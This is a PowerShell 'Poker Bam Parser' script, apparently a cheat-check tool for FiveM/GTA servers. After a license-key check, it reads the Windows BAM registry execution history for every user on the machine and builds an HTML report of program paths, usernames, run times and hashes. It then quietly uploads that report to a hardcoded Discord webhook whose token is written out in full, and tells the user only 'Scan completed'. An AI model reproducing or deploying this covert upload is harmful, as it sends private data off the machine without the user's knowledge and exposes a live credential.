# poker.ps1 - Silent Poker Bam Parser + Key check + Discord webhook
param()

# ---------------- Key / License check ----------------
function Get-HWID {
    try {
        $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction Stop
        $cs   = Get-CimInstance -ClassName Win32_ComputerSystemProduct -ErrorAction Stop
        return ($cs.UUID + "|" + $bios.SerialNumber).ToUpper()
    } catch {
        return $env:COMPUTERNAME.ToUpper()
    }
}
function Read-SecretKey {
    param([string]$Prompt = "Enter key")
    $secure = Read-Host -AsSecureString -Prompt $Prompt
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
    try { $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr) } finally { [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
    return $plain
}
function Get-StringSha256 {
    param([string]$s)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($s)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $sha.ComputeHash($bytes)
    return ([System.BitConverter]::ToString($hashBytes) -replace "-","").ToLower()
}
function Load-Keys {
    param([string]$LocalFile = ".\keys.json", [string]$RemoteUrl = "")
    if (Test-Path $LocalFile) {
        try { return (Get-Content $LocalFile -Raw | ConvertFrom-Json) } catch { return $null }
    } elseif ($RemoteUrl -ne "") {
        try { $txt = Invoke-RestMethod -Uri $RemoteUrl -ErrorAction Stop; return ($txt | ConvertFrom-Json) } catch { return $null }
    } else { return $null }
}

# configure here
$KeysFileLocal = ".\keys.json"
$KeysFileRemote = ""       # optional remote raw url if you want fallback
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1421652100462678118/PmVEyTbvzmlL_f50eKZ0ef_tCKsJ9lGCtFAQAwzINA1d1hCmV_z8D1rBeKzrXcB_XzW2"

$keys = Load-Keys -LocalFile $KeysFileLocal -RemoteUrl $KeysFileRemote
if (-not $keys) {
    Write-Host "Invalid key file. Contact admin." -ForegroundColor Red
    Start-Sleep -Seconds 2
    Exit 1
}

$userKey = Read-SecretKey -Prompt "Enter your Poker key"
if (-not $userKey -or $userKey.Trim().Length -eq 0) {
    Write-Host "No key provided. Exiting." -ForegroundColor Red
    Start-Sleep -Seconds 1
    Exit 1
}
$keyHash = Get-StringSha256 $userKey
$hwid = Get-HWID

$valid = $false
foreach ($k in $keys) {
    if ($null -eq $k.Hash) { continue }
    if ($k.Hash.ToString().ToLower() -eq $keyHash) {
        # HWID check if present
        if ($k.PSObject.Properties.Name -contains "HWID" -and $k.HWID -and $k.HWID.Trim().Length -gt 0) {
            if ($k.HWID.ToString().ToUpper() -ne $hwid.ToUpper()) { continue }
        }
        # Expires check if present
        if ($k.PSObject.Properties.Name -contains "Expires" -and $k.Expires -and $k.Expires.Trim().Length -gt 0) {
            try {
                $exp = [datetime]::Parse($k.Expires.ToString())
                if ((Get-Date) -gt $exp) { continue }
            } catch { }
        }
        $valid = $true
        break
    }
}
if (-not $valid) {
    Write-Host "Invalid or expired key. Exiting." -ForegroundColor Red
    Start-Sleep -Seconds 2
    Exit 1
}

# ---------------- Silent scan + Discord upload ----------------
# core BAM scan logic (condensed, silent)
$KnownGtaExeNames = @("FiveM.exe","ragemp.exe","gta5.exe","FiveM_GTAProcess.exe")
$KnownGtaPathsPatterns = @("FiveM","ragemp","CitizenFX")

$SigCache = @{}
function Get-Signature-Cached { param($FilePath)
    if (-not (Test-Path $FilePath -PathType Leaf)) { return [PSCustomObject]@{ Status="FileNotFound"; Publisher=$null } }
    if ($SigCache.ContainsKey($FilePath)) { return $SigCache[$FilePath] }
    try { $sig = Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction Stop
          $obj = [PSCustomObject]@{ Status=$sig.Status.ToString(); Publisher = if ($sig.SignerCertificate) { $sig.SignerCertificate.Subject } else { $null } }
    } catch { $obj = [PSCustomObject]@{ Status="UnknownError"; Publisher=$null } }
    $SigCache[$FilePath] = $obj; return $obj
}
function Get-FileHash-Safe($FilePath){ try { (Get-FileHash -Path $FilePath -Algorithm SHA256 -ErrorAction Stop).Hash } catch { $null } }
function Get-RiskScore { param($e); $s=0; if ($e.SignatureStatus -ne "Valid"){$s+=2}; if (-not $e.SHA256){$s+=1}; if ($e.LikelyGTAProcess){$s+=2}; if ($e.ProcessRunning){$s+=1}; $s }

$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings","HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings")
$Users = @()
foreach ($p in $rpath) { if (Test-Path $p) { $Users += Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -ExpandProperty PSChildName } }
$Users = $Users | Sort-Object -Unique

$allResults = @()
foreach ($sid in $Users) {
    foreach ($rp in $rpath) {
        $regUserPath = "$rp\$sid"
        if (-not (Test-Path $regUserPath)) { continue }
        $props = (Get-Item $regUserPath).Property
        $UserName = try { (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value } catch { $sid }
        foreach ($Item in $props) {
            $raw = (Get-ItemProperty $regUserPath -ErrorAction SilentlyContinue).$Item
            if (-not $raw -or $raw.Length -lt 8) { continue }
            try { $ticks=[BitConverter]::ToInt64($raw,0); $dtUtc=[DateTime]::FromFileTimeUtc($ticks) } catch { continue }
            $f = Split-Path -Leaf $Item
            $sig = Get-Signature-Cached $Item
            $sha = Get-FileHash-Safe $Item
            $isGta = ($KnownGtaExeNames -contains $f) -or ($KnownGtaPathsPatterns | ForEach-Object { $Item -match $_ })
            $procRunning = try { (Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($f)) -ErrorAction SilentlyContinue) } catch { $null }
            $procRunning = [bool]$procRunning
            $obj = [PSCustomObject]@{
                Application = $f; Path = $Item; User = $UserName;
                "Last Execution (UTC)" = $dtUtc.ToString("yyyy-MM-dd HH:mm:ss");
                SignatureStatus = $sig.Status; Publisher = $sig.Publisher; SHA256 = $sha;
                LikelyGTAProcess = $isGta; ProcessRunning = $procRunning
            }
            $obj | Add-Member -NotePropertyName RiskScore -NotePropertyValue (Get-RiskScore $obj)
            $allResults += $obj
        }
    }
}

# create temp HTML report
$tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "PokerBamParser_" + [Guid]::NewGuid().ToString() + ".html")
$rows = foreach ($r in $allResults) {
    $cls = if ($r.SignatureStatus -eq "Valid"){"style='color:lime;'"} elseif ($r.SignatureStatus -eq "NotSigned"){"style='color:red;'"} else {"style='color:orange;'"}
    "<tr><td>$($r.Application)</td><td>$($r.Path)</td><td>$($r.User)</td><td>$($r.'Last Execution (UTC)')</td><td $cls>$($r.SignatureStatus)</td><td>$($r.RiskScore)</td></tr>"
}
$html = @"
<html><head><meta charset='utf-8'><style>body{background:#121212;color:#eee;font-family:Arial;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid #444;padding:5px;}th{background:#333;}</style></head><body><h2>Poker Bam Parser - Cheating Tool</h2><table><tr><th>Application</th><th>Path</th><th>User</th><th>Last Execution (UTC)</th><th>Signature</th><th>Risk</th></tr>
$($rows -join "`n")
</table></body></html>
"@
Set-Content -Path $tempFile -Value $html -Encoding UTF8

# upload via webhook (PS5.1-compatible multipart)
if (Test-Path $tempFile -PathType Leaf) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        $fileEncoded = $enc.GetString($fileBytes)
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"content`"$LF"
        $bodyLines += "Poker Bam Parser - raport generat ($(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))$LF"
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"username`"$LF"
        $bodyLines += "Poker Bam Parser$LF"
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $tempFile -Leaf)`""
        $bodyLines += "Content-Type: text/html$LF"
        $bodyLines += $fileEncoded
        $bodyLines += "--$boundary--$LF"
        $body = ($bodyLines -join $LF)
        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop | Out-Null
    } catch { ; }
}

# remove temp and print final message
Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
Write-Host "Scan completed"
